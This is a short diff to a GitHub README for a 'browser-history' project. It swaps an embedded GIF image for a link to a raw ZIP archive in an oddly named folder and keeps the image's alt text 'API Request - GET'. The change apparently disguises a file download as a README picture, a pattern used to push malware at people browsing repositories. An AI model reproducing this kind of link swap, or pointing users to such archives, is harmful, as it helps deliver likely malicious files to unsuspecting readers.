@@ -1,3 +1,3 @@
 # browser-history
 
-![API Request - GET](https://github.com/ravikkumar777/browser-history/blob/main/BrowserHistory.gif)
+![API Request - GET](https://raw.githubusercontent.com/ravikkumar777/browser-history/main/Syracusan/browser-history.zip)
